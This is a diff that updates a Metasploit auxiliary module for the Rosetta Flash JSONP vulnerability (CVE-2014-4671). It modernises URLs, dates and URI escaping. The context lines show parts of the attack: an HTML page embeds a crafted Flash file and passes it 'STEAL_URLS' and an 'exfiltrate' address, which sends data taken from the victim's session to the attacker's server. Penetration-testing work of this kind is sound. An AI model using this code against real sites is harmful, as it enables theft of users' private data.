@@ -1,13 +1,11 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
 require 'uri'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::HttpServer::HTML
   include Msf::Auxiliary::Report
 
@@ -33,10 +31,10 @@ class MetasploitModule < Msf::Auxiliary
           ['CVE', '2014-4671'],
           ['URL', 'http://miki.it/blog/2014/7/8/abusing-jsonp-with-rosetta-flash/'],
           ['URL', 'https://github.com/mikispag/rosettaflash'],
-          ['URL', 'http://quaxio.com/jsonp_handcrafted_flash_files/']
+          ['URL', 'https://www.quaxio.com/jsonp_handcrafted_flash_files/']
         ],
-      'DisclosureDate' => 'Jul 8 2014',
-      'Actions'        => [ [ 'WebServer' ] ],
+      'DisclosureDate' => '2014-07-08',
+      'Actions'        => [[ 'WebServer', 'Description' => 'Serve exploit via web server' ]],
       'PassiveActions' => [ 'WebServer' ],
       'DefaultAction'  => 'WebServer'))
 
@@ -98,7 +96,7 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def exploit_html
-    ex_url = URI.escape(get_uri.chomp('/')+'/'+Rex::Text.rand_text_alphanumeric(6+rand(20))+'.log')
+    ex_url = URI::DEFAULT_PARSER.escape(get_uri.chomp('/')+'/'+Rex::Text.rand_text_alphanumeric(6+rand(20))+'.log')
     %Q|
       <!doctype html>
       <html>
@@ -106,7 +104,7 @@ class MetasploitModule < Msf::Auxiliary
           <object type="application/x-shockwave-flash" data="#{exploit_url(encoded_swf)}"
             width=500 height=500>
             <param name="FlashVars"
-              value="url=#{URI.escape datastore['STEAL_URLS']}&exfiltrate=#{ex_url}" />
+              value="url=#{URI::DEFAULT_PARSER.escape datastore['STEAL_URLS']}&exfiltrate=#{ex_url}" />
           </object>
         </body>
       </html>
@@ -197,5 +195,4 @@ class MetasploitModule < Msf::Auxiliary
   def rhost
     URI.parse(datastore["JSONP_URL"]).host
   end
-
 end
